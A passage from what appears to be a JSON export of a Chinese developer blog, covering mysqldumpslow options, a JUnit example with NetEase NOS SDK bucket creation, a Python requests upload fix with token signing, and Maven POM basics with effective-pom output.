instead of first) -t NUM just show the top n queries -a don&apos;t abstract all numbers to N and strings to &apos;S&apos; -n NUM abstract numbers with at least n digits within names -g PATTERN grep: only consider stmts that include this string -h HOSTNAME hostname of db server for *-slow.log filename (can be wildcard), default is &apos;*&apos;, i.e. match all -i NAME name of server instance (if using mysql.server startup script) -l don&apos;t subtract lock time from total time-s, 是表示按照何种方式排序， c: 访问计数 l: 锁定时间 r: 返回记录 t: 查询时间 al:平均锁定时间 ar:平均返回记录数 at:平均查询时间-t, 是top n的意思，即为返回前面多少条的数据； -g, 后边可以写一个正则匹配模式，大小写不敏感的； 例如 得到返回记录集最多的10个SQL。 mysqldumpslow -s r -t 10 /mysql/mysql06_slow.log得到访问次数最多的10个SQL mysqldumpslow -s c -t 10 /mysql/mysql06_slow.log得到按照时间排序的前10条里面含有左连接的查询语句。 mysqldumpslow -s t -t 10 -g “left join” /mysql/mysql06_slow.log另外建议在使用这些命令时结合 | 和more 使用 ，否则有可能出现刷屏的情况。 mysqldumpslow -s r -t 20 /mysql/mysql06-slow.log | more","categories":[],"tags":[]},{"title":"Java 的JUnit 使用","slug":"Java-的Junit-使用","date":"2018-01-26T08:38:51.000Z","updated":"2021-02-26T06:05:29.250Z","comments":true,"path":"posts/17863.html","link":"","permalink":"https://awen.me/posts/17863.html","excerpt":"什么是JUnitJUnit 是一个回归测试框架，被开发者用于实施对应用程序的单元测试，加快程序编制速度，同时提高编码的质量。JUnit 测试框架能够轻松完成以下任意两种结合：","text":"什么是JUnitJUnit 是一个回归测试框架，被开发者用于实施对应用程序的单元测试，加快程序编制速度，同时提高编码的质量。JUnit 测试框架能够轻松完成以下任意两种结合： Eclipse 集成开发环境 Ant 打包工具 Maven 项目构建管理 特性JUnit 测试框架具有以下重要特性： 测试工具 测试套件 测试运行器 测试分类 直接已一个实例讲解，准备两个 class，这里我使用网易云的nos sdk演示 例子首先，新建一个maven 工程，在 pom.xml 中添加 &lt;dependency&gt; &lt;groupId&gt;com.netease.cloud&lt;/groupId&gt; &lt;artifactId&gt;nos-sdk-java-publiccloud&lt;/artifactId&gt; &lt;version&gt;0.0.2&lt;/version&gt; &lt;/dependency&gt;然后创建一个class 为nossdkdemo，内容如下 package com.nos.app.nos.sdk; import com.netease.cloud.auth.BasicCredentials; import com.netease.cloud.auth.Credentials; import com.netease.cloud.services.nos.NosClient; import com.netease.cloud.services.nos.model.CannedAccessControlList; import com.netease.cloud.services.nos.model.CreateBucketRequest; public class NosSdkDemo { /** * 创建公有桶 * @param access 网易云控制台获取accesskey * @param secret 网易云控制台获取 secretkey * @param endpoint 网易云对象存储服务中获取 * @param nosname nos的名称 */ public static void CreatePublicBucket(String access, String secret,String endpoint,String nosname) { String accessKey = access; String secretKey = secret; Credentials credentials = new BasicCredentials(accessKey, secretKey); NosClient nosClient = new NosClient(credentials); nosClient.setEndpoint(endpoint); CreateBucketRequest request = new CreateBucketRequest(nosname); request.setCannedAcl(CannedAccessControlList.PublicRead); nosClient.createBucket(request); } /** * 创建私有桶 * @param access 网易云控制台获取accesskey * @param secret 网易云控制台获取 secretkey * @param endpoint 网易云对象存储服务中获取 * @param nosname nos的名称 */ public static void CreatePrivateBucket(String access, String secret,String endpoint,String nosname) { String accessKey = access; String secretKey = secret; Credentials credentials = new BasicCredentials(accessKey, secretKey); NosClient nosClient = new NosClient(credentials); nosClient.setEndpoint(endpoint); CreateBucketRequest request = new CreateBucketRequest(nosname); request.setCannedAcl(CannedAccessControlList.Private); nosClient.createBucket(request); } }在创建一个 class 内容如下 package com.nos.app.nos.sdk; import org.junit.Test; import com.nos.app.nos.sdk.*; public class TestClass { // @Test /** * 测试创建公有桶 */ public void testCreatePublicBucket() { NosSdkDemo.CreatePublicBucket(&quot;&quot;,&quot;&quot;,&quot;nos-eastchina1.126.net&quot;, &quot;2018&quot;); } @Test /* * 测试创建私有桶 */ public void testCreatePrivateBucket() { NosSdkDemo.CreatePrivateBucket(&quot;&quot;,&quot;&quot;,&quot;nos-eastchina1.126.net&quot;, &quot;2019&quot;); } }没错，其中的 @Test 就是用来进行单元测试的，单写完一个方法进行调试时候，我们可以使用Junit来进行测试，当测试完后直接把 @Test 注释掉就可以了。而不必把一整段代码注释掉，如图所示 如图成功，则会显示绿色的进度条 失败也会显示失败原因","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://awen.me/tags/java/"}]},{"title":"使用requests 库上传文件遇到的坑","slug":"使用requests-库上传文件遇到的坑","date":"2018-01-25T06:55:10.000Z","updated":"2021-02-26T06:05:29.310Z","comments":true,"path":"posts/1168.html","link":"","permalink":"https://awen.me/posts/1168.html","excerpt":"在将文件上传到对象存储时，验证 token 都是成功的，但是上传的文件一直打不开，一开","text":"在将文件上传到对象存储时，验证 token 都是成功的，但是上传的文件一直打不开，一开 始我是这样写的上传的: url = requestaddress+&apos;/&apos;+bucketname+&apos;/&apos;+objectname files = {&apos;file&apos;: open(filepath,&apos;rb&apos;)} r = requests.post(url,params=querystring,headers=headers,files=files) print(r.json())但是上传后的文件一直打不开。抓包查看请求数据，发现会带有 --94642781300f420a8263e3833d1965cb..Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.jpg&quot; 8....jU&apos;.h..d..4TnJ.........--94642781300f420a8263e3833d1965cb--..这些数据 看了requests 的官网的文档说是强烈推荐使用二进制方式上传文件，因为 于是使用with open 打开文件后上传 with open(filepath, &apos;r&apos;) as f: r = requests.post(url,params=querystring,headers=headers,data=f) print(r.json())结果发现可以 附上传代码#!/usr/bin/python # -*- coding: utf-8 -*- import base64 import hmac import hashlib import time import requests import json import datetime # 计算token def token(accesskey,secretkey,bucketname,objectname): expirestime = int(time.time()+6000) json_data = {&quot;Bucket&quot;:bucketname,&quot;Object&quot;:objectname,&quot;Expires&quot;:expirestime} putpolicy = json.dumps(json_data) encodedputpolicy = base64.b64encode(putpolicy) signature = hmac.new(secretkey, encodedputpolicy, digestmod=hashlib.sha256).digest(); encodedsign = base64.b64encode(signature) token = &quot;UPLOAD &quot; + accesskey + &quot;:&quot; + encodedsign + &quot;:&quot; + encodedputpolicy return token # 获取最佳节点 def getnode(bucketname): url =&apos;http://lbs-eastchina1.126.net/lbs?version=1.0&apos;+&apos;&amp;bucketname=&apos;+bucketname node = requests.get(url) nodeValue= node.json() return nodeValue[&apos;upload&apos;][0] # 分块上传 def postfile(xnostoken,bucketname, objectname,offset, complete,host,contentlength, contenttype,filepath): gmtformat = &apos;%a, %d %b %Y %H:%M:%S GMT&apos; gmtdate = datetime.datetime.utcnow().strftime(gmtformat) querystring = {&quot;offset&quot;:offset,&quot;complete&quot;:complete,&quot;version&quot;:1.0} headers = {&apos;Host&apos;:host,&apos;Content-Length&apos;:contentlength, &apos;x-nos-token&apos;:xnostoken,&apos;Content-type&apos;:contenttype,&apos;Date&apos;:gmtdate} requestaddress = getnode(bucketname) requestaddress = str(requestaddress) url = requestaddress+&apos;/&apos;+bucketname+&apos;/&apos;+objectname with open(filepath, &apos;r&apos;) as f: requestapi = requests.post(url,params=querystring,headers=headers,data=f) print(requestapi.json()) def main(): bucketname = &apos;netease01&apos; objectname = &apos;3.jpg&apos; accesskey = &quot;&quot; secretkey = &quot;&quot; offset = 0 complete = True host = &apos;nos-eastchina1.126.net&apos; contenttype = &apos;image/jpeg&apos; contentlength = &apos;34771&apos; filepath = &apos;/Users/wenjun/PycharmProjects/Test/test.jpg&apos; xnostoken = token(accesskey,secretkey,bucketname,objectname) postfile(xnostoken,bucketname,objectname,offset,complete,host,contentlength,contenttype,filepath) if __name__ == &apos;__main__&apos;: main()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"Maven 基础","slug":"Maven-基础","date":"2018-01-24T03:03:17.000Z","updated":"2021-02-26T06:05:29.259Z","comments":true,"path":"posts/10154.html","link":"","permalink":"https://awen.me/posts/10154.html","excerpt":"下载去官网下载 环境变量export M2_HOME=/Users/wenjun/apache-maven-3.5.2 export PATH=$PATH:$M2_HOME/bin确认生效","text":"下载去官网下载 环境变量export M2_HOME=/Users/wenjun/apache-maven-3.5.2 export PATH=$PATH:$M2_HOME/bin确认生效 ➜ apache-maven-3.5.2 mvn --version Apache Maven 3.5.2 (138edd61fd100ec658bfa2d307c43b76940a5d7d; 2017-10-18T15:58:13+08:00) Maven home: /Users/wenjun/apache-maven-3.5.2 Java version: 1.8.0_91, vendor: Oracle Corporation Java home: /Library/Java/JavaVirtualMachines/jdk1.8.0_91.jdk/Contents/Home/jre Default locale: zh_CN, platform encoding: UTF-8 OS name: &quot;mac os x&quot;, version: &quot;10.13.2&quot;, arch: &quot;x86_64&quot;, family: &quot;mac&quot;Maven - POMPOM 代表工程对象模型。它是使用 Maven 工作时的基本组建，是一个 xml 文件。它被放在工程根目录下，文件命名为 pom.xml。 POM 包含了关于工程和各种配置细节的信息，Maven 使用这些信息构建工程。 POM 也包含了目标和插件。当执行一个任务或者目标时，Maven 会查找当前目录下的 POM，从其中读取所需要的配置信息，然后执行目标。能够在 POM 中设置的一些配置如下： project dependencies plugins goals build profiles project version developers mailing list 在创建 POM 之前，我们首先确定工程组（groupId），及其名称（artifactId）和版本，在仓库中这些属性是工程的唯一标识。 &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.companyname.project-group&lt;/groupId&gt; &lt;artifactId&gt;project&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;/project&gt;需要说明的是每个工程应该只有一个 POM 文件。 所有的 POM 文件需要 project 元素和三个必须的字段：groupId, artifactId,version。 在仓库中的工程标识为 groupId:artifactId:version POM.xml 的根元素是 project，它有三个主要的子节点： 节点 描述 groupId 这是工程组的标识。它在一个组织或者项目中通常是唯一的。例如，一个银行组织 com.company.bank 拥有所有的和银行相关的项目。 artifactId 这是工程的标识。它通常是工程的名称。例如，消费者银行。groupId 和 artifactId 一起定义了 artifact 在仓库中的位置。 version 这是工程的版本号。在 artifact 的仓库中，它用来区分不同的版本。例如：com.company.bank:consumer-banking:1.0com.company.bank:consumer-banking:1.1. Super POM所有的 POM 都继承自一个父 POM（无论是否显式定义了这个父 POM）。父 POM 也被称作 Super POM，它包含了一些可以被继承的默认设置。 Maven 使用 effective pom（Super pom 加上工程自己的配置）来执行相关的目标，它帮助开发者在 pom.xml 中做尽可能少的配置，当然这些配置可以被方便的重写。 查看 Super POM 默认配置的一个简单方法是执行以下命令： mvn help:effective-pom输出 ➜ pom mvn help:effective-pom [INFO] Scanning for projects... Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-antrun-plugin/1.3/maven-antrun-plugin-1.3.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-antrun-plugin/1.3/maven-antrun-plugin-1.3.pom (4.7 kB at 1.5 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/12/maven-plugins-12.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/12/maven-plugins-12.pom (12 kB at 26 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-antrun-plugin/1.3/maven-antrun-plugin-1.3.jar Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-antrun-plugin/1.3/maven-antrun-plugin-1.3.jar (24 kB at 42 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-assembly-plugin/2.2-beta-5/maven-assembly-plugin-2.2-beta-5.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-assembly-plugin/2.2-beta-5/maven-assembly-plugin-2.2-beta-5.pom (15 kB at 38 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/16/maven-plugins-16.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/16/maven-plugins-16.pom (13 kB at 33 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-assembly-plugin/2.2-beta-5/maven-assembly-plugin-2.2-beta-5.jar Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-assembly-plugin/2.2-beta-5/maven-assembly-plugin-2.2-beta-5.jar (209 kB at 266 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-dependency-plugin/2.8/maven-dependency-plugin-2.8.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-dependency-plugin/2.8/maven-dependency-plugin-2.8.pom (11 kB at 29 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-dependency-plugin/2.8/maven-dependency-plugin-2.8.jar Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-dependency-plugin/2.8/maven-dependency-plugin-2.8.jar (153 kB at 228 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-release-plugin/2.3.2/maven-release-plugin-2.3.2.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-release-plugin/2.3.2/maven-release-plugin-2.3.2.pom (9.3 kB at 23 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/release/maven-release/2.3.2/maven-release-2.3.2.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/release/maven-release/2.3.2/maven-release-2.3.2.pom (8.6 kB at 22 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-release-plugin/2.3.2/maven-release-plugin-2.3.2.jar Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-release-plugin/2.3.2/maven-release-plugin-2.3.2.jar (44 kB at 106 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-metadata.xml Downloading from central: https://repo.maven.apache.org/maven2/org/codehaus/mojo/maven-metadata.xml Downloaded from central: https://repo.maven.apache.org/maven2/org/codehaus/mojo/maven-metadata.xml (20 kB at 48 kB/s) Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-metadata.xml (14 kB at 13 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-help-plugin/maven-metadata.xml Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-help-plugin/maven-metadata.xml (493 B at 1.4 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-help-plugin/2.2/maven-help-plugin-2.2.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-help-plugin/2.2/maven-help-plugin-2.2.pom (8.7 kB at 22 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-help-plugin/2.2/maven-help-plugin-2.2.jar Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-help-plugin/2.2/maven-help-plugin-2.2.jar (68 kB at 109 kB/s) [INFO] [INFO] ------------------------------------------------------------------------ [INFO] Building project 1.0 [INFO] ------------------------------------------------------------------------ [INFO] [INFO] --- maven-help-plugin:2.2:effective-pom (default-cli) @ project --- Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-tools-api/2.4.3/maven-plugin-tools-api-2.4.3.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-tools-api/2.4.3/maven-plugin-tools-api-2.4.3.pom (4.6 kB at 12 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-tools/2.4.3/maven-plugin-tools-2.4.3.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-tools/2.4.3/maven-plugin-tools-2.4.3.pom (9.9 kB at 25 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/jtidy/jtidy/4aug2000r7-dev/jtidy-4aug2000r7-dev.pom Downloaded from central: https://repo.maven.apache.org/maven2/jtidy/jtidy/4aug2000r7-dev/jtidy-4aug2000r7-dev.pom (1.3 kB at 3.6 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/codehaus/plexus/plexus-container-default/1.0-alpha-7/plexus-container-default-1.0-alpha-7.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/codehaus/plexus/plexus-container-default/1.0-alpha-7/plexus-container-default-1.0-alpha-7.pom (1.3 kB at 3.6 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/plexus/plexus-containers/1.0.2/plexus-containers-1.0.2.pom Downloaded from central: https://repo.maven.apache.org/maven2/plexus/plexus-containers/1.0.2/plexus-containers-1.0.2.pom (471 B at 1.3 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/plexus/plexus-root/1.0.3/plexus-root-1.0.3.pom Downloaded from central: https://repo.maven.apache.org/maven2/plexus/plexus-root/1.0.3/plexus-root-1.0.3.pom (6.0 kB at 15 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/jdom/jdom/1.0/jdom-1.0.pom Downloaded from central: https://repo.maven.apache.org/maven2/jdom/jdom/1.0/jdom-1.0.pom (1.2 kB at 3.2 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/com/thoughtworks/xstream/xstream/1.4.3/xstream-1.4.3.pom Downloaded from central: https://repo.maven.apache.org/maven2/com/thoughtworks/xstream/xstream/1.4.3/xstream-1.4.3.pom (8.6 kB at 22 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/com/thoughtworks/xstream/xstream-parent/1.4.3/xstream-parent-1.4.3.pom Downloaded from central: https://repo.maven.apache.org/maven2/com/thoughtworks/xstream/xstream-parent/1.4.3/xstream-parent-1.4.3.pom (19 kB at 48 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/codehaus/codehaus-parent/3/codehaus-parent-3.pom Downloaded from central: https://repo.maven.apache.org/maven2/org/codehaus/codehaus-parent/3/codehaus-parent-3.pom (4.1 kB at 10 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/xmlpull/xmlpull/1.1.3.1/xmlpull-1.1.3.1.pom Downloaded from central: https://repo.maven.apache.org/maven2/xmlpull/xmlpull/1.1.3.1/xmlpull-1.1.3.1.pom (386 B at 1.1 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-tools-api/2.4.3/maven-plugin-tools-api-2.4.3.jar Downloading from central: https://repo.maven.apache.org/maven2/jtidy/jtidy/4aug2000r7-dev/jtidy-4aug2000r7-dev.jar Downloading from central: https://repo.maven.apache.org/maven2/org/codehaus/plexus/plexus-utils/1.5.7/plexus-utils-1.5.7.jar Downloading from central: https://repo.maven.apache.org/maven2/com/thoughtworks/xstream/xstream/1.4.3/xstream-1.4.3.jar Downloading from central: https://repo.maven.apache.org/maven2/jdom/jdom/1.0/jdom-1.0.jar Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-tools-api/2.4.3/maven-plugin-tools-api-2.4.3.jar (51 kB at 123 kB/s) Downloading from central: https://repo.maven.apache.org/maven2/xmlpull/xmlpull/1.1.3.1/xmlpull-1.1.3.1.jar Downloaded from central: https://repo.maven.apache.org/maven2/org/codehaus/plexus/plexus-utils/1.5.7/plexus-utils-1.5.7.jar (266 kB at 334 kB/s) Downloaded from central: https://repo.maven.apache.org/maven2/xmlpull/xmlpull/1.1.3.1/xmlpull-1.1.3.1.jar (7.2 kB at 8.9 kB/s) Downloaded from central: https://repo.maven.apache.org/maven2/jdom/jdom/1.0/jdom-1.0.jar (153 kB at 92 kB/s) Downloaded from central: https://repo.maven.apache.org/maven2/jtidy/jtidy/4aug2000r7-dev/jtidy-4aug2000r7-dev.jar (138 kB at 82 kB/s) Downloaded from central: https://repo.maven.apache.org/maven2/com/thoughtworks/xstream/xstream/1.4.3/xstream-1.4.3.jar (482 kB at 209 kB/s) [INFO] Effective POMs, after inheritance, interpolation, and profiles are applied: &lt;!-- ====================================================================== --&gt; &lt;!-- --&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.companyname.project-group&lt;/groupId&gt; &lt;artifactId&gt;project&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;repositories&gt; &lt;repository&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;id&gt;central&lt;/id&gt; &lt;name&gt;Central Repository&lt;/name&gt; &lt;url&gt;https://repo.maven.apache.org/maven2&lt;/url&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;releases&gt; &lt;updatePolicy&gt;never&lt;/updatePolicy&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;id&gt;central&lt;/id&gt; &lt;name&gt;Central Repository&lt;/name&gt; &lt;url&gt;https://repo.maven.apache.org/maven2&lt;/url&gt; &lt;/pluginRepository&gt; &lt;/pluginRepositories&gt; &lt;build&gt; &lt;sourceDirectory&gt;/Users/wenjun/Downloads/pom/src/main/java&lt;/sourceDirectory&gt; &lt;scriptSourceDirectory&gt;/Users/wenjun/Downloads/pom/src/main/scripts&lt;/scriptSourceDirectory&gt; &lt;testSourceDirectory&gt;/Users/wenjun/Downloads/pom/src/test/java&lt;/testSourceDirectory&gt; &lt;outputDirectory&gt;/Users/wenjun/Downloads/pom/target/classes&lt;/outputDirectory&gt; &lt;testOutputDirectory&gt;/Users/wenjun/Downloads/pom/target/test-classes&lt;/testOutputDirectory&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;/Users/wenjun/Downloads/pom/src/main/resources&lt;/directory&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;testResources&gt; &lt;testResource&gt; &lt;directory&gt;/Users/wenjun/Downloads/pom/src/test/resources&lt;/directory&gt; &lt;/testResource&gt; &lt;/testResources&gt; &lt;directory&gt;/Users/wenjun/Downloads/pom/target&lt;/directory&gt; &lt;finalName&gt;project-1.0&lt;/finalName&gt; &lt;pluginManagement&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-antrun-plugin&lt;/artifactId&gt; &lt;version&gt;1.3&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;version&gt;2.2-beta-5&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt; &lt;version&gt;2.8&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-release-plugin&lt;/artifactId&gt; &lt;version&gt;2.3.2&lt;/version&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/pluginManagement&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default-clean&lt;/id&gt; &lt;phase&gt;clean&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;clean&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;version&gt;2.6&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default-testResources&lt;/id&gt; &lt;phase&gt;process-test-resources&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;testResources&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;execution&gt; &lt;id&gt;default-resources&lt;/id&gt; &lt;phase&gt;process-resources&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;resources&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt; &lt;version&gt;2.4&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default-jar&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;jar&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default-compile&lt;/id&gt; &lt;phase&gt;compile&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;compile&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;execution&gt; &lt;id&gt;default-testCompile&lt;/id&gt; &lt;phase&gt;test-compile&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;testCompile&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.12.4&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default-test&lt;/id&gt; &lt;phase&gt;test&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;test&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt; &lt;version&gt;2.4&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default-install&lt;/id&gt; &lt;phase&gt;install&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;install&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt; &lt;version&gt;2.7&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default-deploy&lt;/id&gt; &lt;phase&gt;deploy&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;deploy&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-site-plugin&lt;/artifactId&gt; &lt;version&gt;3.3&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default-site&lt;/id&gt; &lt;phase&gt;site&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;site&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;outputDirectory&gt;/Users/wenjun/Downloads/pom/target/site&lt;/outputDirectory&gt; &lt;reportPlugins&gt; &lt;reportPlugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-project-info-reports-plugin&lt;/artifactId&gt; &lt;/reportPlugin&gt; &lt;/reportPlugins&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;execution&gt; &lt;id&gt;default-deploy&lt;/id&gt; &lt;phase&gt;site-deploy&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;deploy&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;outputDirectory&gt;/Users/wenjun/Downloads/pom/target/site&lt;/outputDirectory&gt; &lt;reportPlugins&gt; &lt;reportPlugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-project-info-reports-plugin&lt;/artifactId&gt; &lt;/reportPlugin&gt; &lt;/reportPlugins&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;outputDirectory&gt;/Users/wenjun/Downloads/pom/target/site&lt;/outputDirectory&gt; &lt;reportPlugins&gt; &lt;reportPlugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-project-info-reports-plugin&lt;/artifactId&gt; &lt;/reportPlugin&gt; &lt;/reportPlugins&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;reporting&gt; &lt;outputDirectory&gt;/Users/wenjun/Downloads/pom/target/site&lt;/outputDirectory&gt; &lt;/reporting&gt; &lt;/project&gt; [INFO] ------------------------------------------------------------------------ [INFO] BUILD SUCCESS [INFO] ------------------------------------------------------------------------ [INFO] Total time: 18.684 s [INFO] Finished at: 2018-01-24T11:02:28+08:00 [INFO] Final Memory: 14M/135M [INFO] ------------------------------------------------------------------------eclipse 创建 maven 工程1.新建项目，选择 Maven-Maven Project 2.按如图所示配置 3.填写好相应的groupId,artifactId,version等信息，点击Finish 4.创建工程，找到pom.xml 比如我们要增加一个 jgit，则其配置如下 &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; 